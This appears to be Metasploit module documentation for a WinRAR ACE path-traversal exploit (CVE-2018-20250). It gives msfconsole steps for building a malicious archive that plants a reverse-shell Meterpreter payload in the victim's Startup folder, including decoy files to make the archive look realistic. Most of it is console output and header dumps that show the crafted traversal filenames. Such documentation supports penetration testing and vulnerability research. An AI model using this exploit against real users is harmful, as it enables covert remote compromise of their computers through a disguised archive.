## Introduction

**From the CVE-2018-20250 NVD Page**:
In WinRAR versions prior to and including 5.61, there is a path traversal vulnerability when crafting the filename field of the ACE format (in UNACEV2.dll). When the filename field is manipulated with specific patterns, the destination (extraction) folder is ignored, thus treating the filename as an absolute path.

This module will attempt to extract a payload to the startup folder of the current user. It is limited such that we can only go back one folder. Therefore, for this exploit to work properly, the user must extract the supplied RAR file from one folder within the user profile folder (e.g. Desktop or Downloads). User restart is required to gain a shell.

## Vulnerable Application

- RARLAB WinRAR <= 5.61

## Verification Steps

1. Start msfconsole
2. Do: `use exploit/windows/fileformat/winrar_ace`
3. Do: `set FILENAME [FILENAME]`. Name is `msf.ace` by default.
4. Optional: Do: `set CUSTFILE [CUSTFILE]` to use a custom payload.
5. Optional: Do: `set PAYLOAD [PAYLOAD]`. `windows/meterpreter/reverse_tcp` by default. Skip if using a custom payload.
6. Configure your payload if using a Metasploit-provided payload. Skip if using a custom payload.
7. Optional: Do: `set FILE_LIST [FILE_LIST]` to provide a list of other files to add to the ACE archive.
8. Do: `exploit`
9. **Verify** that a file is created (by default in `~/.msf4/local/`) and that it passes `**acefile.py**`'s checks

## Options

**FILENAME**
Filename to output. Default is `msf.ace`. Other extensions like `rar` and `zip` can be used as WinRAR parses files by their headers and not by extension.

**CUSTFILE**
Optional. Custom payload to use. Can be anything. Just be aware that some files are not *meant* to be executed in case you're wondering why the shellz ain't poppin'.

**FILE_LIST**
Optional. A list of other files to be included in the resulting ACE archive. The specified file must contain full paths to other files. Compression is NOT taking place. This can be used to make the output file seem more realistic.

## Examples

- Tested on a Windows Server 2019 Datacenter x64, fully patched, with WinRAR 5.61

### Test with autogenerated payload, no additional files in archive
Output from Metasploit:
```
msf5 exploit(windows/fileformat/winrar_ace) > set LHOST 172.16.72.1
LHOST => 172.16.72.1
msf5 exploit(windows/fileformat/winrar_ace) > exploit

[*] Payload filename: sGrBPr.exe
[+] msf.ace stored at /home/msfdev2/.msf4/local/msf.ace
msf5 exploit(windows/fileformat/winrar_ace) > 
```

Verify checksums using `acefile`:
```
msfdev2@automata:~$ python3 acefile.py --headers .msf4/local/msf.ace
volume
    filename    .msf4/local/msf.ace
    filesize    73972
    headers     MAIN:1 FILE:1 others:0
header
    hdr_crc     0x286b
    hdr_size    49
    hdr_type    0x00        MAIN
    hdr_flags   0x9000      ADVERT|SOLID
    magic       b'**ACE**'
    eversion    20          2.0
    cversion    20          2.0
    host        0x02        Win32
    volume      0
    datetime    0x4e561810  2019-02-22 03:00:32
    reserved1   97 4f f6 aa 00 00 00 00
    advert      b'*UNREGISTERED VERSION*'
    comment     b''
    reserved2   b''
header
    hdr_crc     0x0131
    hdr_size    113
    hdr_type    0x01        FILE32
    hdr_flags   0x8001      ADDSIZE|SOLID
    packsize    73802
    origsize    73802
    datetime    0x4e55b063  2019-02-21 22:03:06
    attribs     0x00000020  ARCHIVE
    crc32       0xab7ba1d3
    comptype    0x00        stored
    compqual    0x03        normal
    params      0x000a
    reserved1   0x4554
    filename    b'C:\\C:C:../AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sGrBPr.exe'
    comment     b''
    ntsecurity  b''
    reserved2   b''
msfdev2@automata:~$ 
```

### Test with custom payload, no additional files in archive
Custom payload to be used:
```
msfdev2@automata:~$ ls -la | grep abcdef.exe
-rw-r--r--  1 msfdev2 msfdev2   73802 Apr 16 22:11 abcdef.exe
msfdev2@automata:~$ 
```

Output from Metasploit:
```
msf5 exploit(windows/fileformat/winrar_ace) > set CUSTFILE /home/msfdev2/abcdef.exe
CUSTFILE => /home/msfdev2/abcdef.exe
msf5 exploit(windows/fileformat/winrar_ace) > set FILENAME msf2.ace
FILENAME => msf2.ace
msf5 exploit(windows/fileformat/winrar_ace) > set LHOST 172.16.79.1
LHOST => 172.16.79.1
msf5 exploit(windows/fileformat/winrar_ace) > exploit

[*] Using a custom payload: abcdef.exe
[*] Payload filename: abcdef.exe
[+] msf2.ace stored at /home/msfdev2/.msf4/local/msf2.ace
msf5 exploit(windows/fileformat/winrar_ace) > 
```

Verify checksums using `acefile`:
```
msfdev2@automata:~$ python3 acefile.py --headers .msf4/local/msf2.ace
volume
    filename    .msf4/local/msf2.ace
    filesize    73972
    headers     MAIN:1 FILE:1 others:0
header
    hdr_crc     0x286b
    hdr_size    49
    hdr_type    0x00        MAIN
    hdr_flags   0x9000      ADVERT|SOLID
    magic       b'**ACE**'
    eversion    20          2.0
    cversion    20          2.0
    host        0x02        Win32
    volume      0
    datetime    0x4e561810  2019-02-22 03:00:32
    reserved1   97 4f f6 aa 00 00 00 00
    advert      b'*UNREGISTERED VERSION*'
    comment     b''
    reserved2   b''
header
    hdr_crc     0x14c6
    hdr_size    113
    hdr_type    0x01        FILE32
    hdr_flags   0x8001      ADDSIZE|SOLID
    packsize    73802
    origsize    73802
    datetime    0x4e55b063  2019-02-21 22:03:06
    attribs     0x00000020  ARCHIVE
    crc32       0x6735f66e
    comptype    0x00        stored
    compqual    0x03        normal
    params      0x000a
    reserved1   0x4554
    filename    b'C:\\C:C:../AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\abcdef.exe'
    comment     b''
    ntsecurity  b''
    reserved2   b''
msfdev2@automata:~$ 
```

### Test with custom payload, 2 additional files in archive
Contents of `FILE_LIST`:
```
msfdev2@automata:~$ cat ace_files.txt 
/home/msfdev2/hello.txt
/home/msfdev2/world.txt
msfdev2@automata:~$ 
```

Contents of each file in the list:
```
msfdev2@automata:~$ cat hello.txt
hello
msfdev2@automata:~$ cat world.txt
world
msfdev2@automata:~$ 
```

Custom payload to be used:
```
msfdev2@automata:~$ ls -la | grep abcdef.exe
-rw-r--r--  1 msfdev2 msfdev2   73802 Apr 16 22:11 abcdef.exe
msfdev2@automata:~$ 
```

Output from Metasploit:
```
msf5 exploit(windows/fileformat/winrar_ace) > set CUSTFILE /home/msfdev2/abcdef.exe
CUSTFILE => abcdef.exe
msf5 exploit(windows/fileformat/winrar_ace) > set FILE_LIST /home/msfdev2/ace_files.txt
FILE_LIST => ace_files.txt
msf5 exploit(windows/fileformat/winrar_ace) > set FILENAME custom.ace
FILENAME => custom.ace
msf5 exploit(windows/fileformat/winrar_ace) > set LHOST 172.16.79.1
LHOST => 172.16.79.1
msf5 exploit(windows/fileformat/winrar_ace) > exploit

[*] Using the provided list of files @ /home/msfdev2/ace_files.txt...
[*] Using a custom payload: abcdef.exe
[*] Payload filename: abcdef.exe
[+] custom.ace stored at /home/msfdev2/.msf4/local/custom.ace
msf5 exploit(windows/fileformat/winrar_ace) > 
```

Verify checksums using `acefile`:
```
msfdev2@automata:~$ python3 acefile.py --headers .msf4/local/custom.ace
volume
    filename    .msf4/local/custom.ace
    filesize    74072
    headers     MAIN:1 FILE:3 others:0
header
    hdr_crc     0x286b
    hdr_size    49
    hdr_type    0x00        MAIN
    hdr_flags   0x9000      ADVERT|SOLID
    magic       b'**ACE**'
    eversion    20          2.0
    cversion    20          2.0
    host        0x02        Win32
    volume      0
    datetime    0x4e561810  2019-02-22 03:00:32
    reserved1   97 4f f6 aa 00 00 00 00
    advert      b'*UNREGISTERED VERSION*'
    comment     b''
    reserved2   b''
header
    hdr_crc     0x8965
    hdr_size    40
    hdr_type    0x01        FILE32
    hdr_flags   0x8001      ADDSIZE|SOLID
    packsize    6
    origsize    6
    datetime    0x4e55b063  2019-02-21 22:03:06
    attribs     0x00000020  ARCHIVE
    crc32       0xc9c5cfdf
    comptype    0x00        stored
    compqual    0x03        normal
    params      0x000a
    reserved1   0x4554
    filename    b'hello.txt'
    comment     b''
    ntsecurity  b''
    reserved2   b''
header
    hdr_crc     0x3161
    hdr_size    40
    hdr_type    0x01        FILE32
    hdr_flags   0x8001      ADDSIZE|SOLID
    packsize    6
    origsize    6
    datetime    0x4e55b063  2019-02-21 22:03:06
    attribs     0x00000020  ARCHIVE
    crc32       0x22c79e57
    comptype    0x00        stored
    compqual    0x03        normal
    params      0x000a
    reserved1   0x4554
    filename    b'world.txt'
    comment     b''
    ntsecurity  b''
    reserved2   b''
header
    hdr_crc     0x14c6
    hdr_size    113
    hdr_type    0x01        FILE32
    hdr_flags   0x8001      ADDSIZE|SOLID
    packsize    73802
    origsize    73802
    datetime    0x4e55b063  2019-02-21 22:03:06
    attribs     0x00000020  ARCHIVE
    crc32       0x6735f66e
    comptype    0x00        stored
    compqual    0x03        normal
    params      0x000a
    reserved1   0x4554
    filename    b'C:\\C:C:../AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\abcdef.exe'
    comment     b''
    ntsecurity  b''
    reserved2   b''
msfdev2@automata:~$ 
```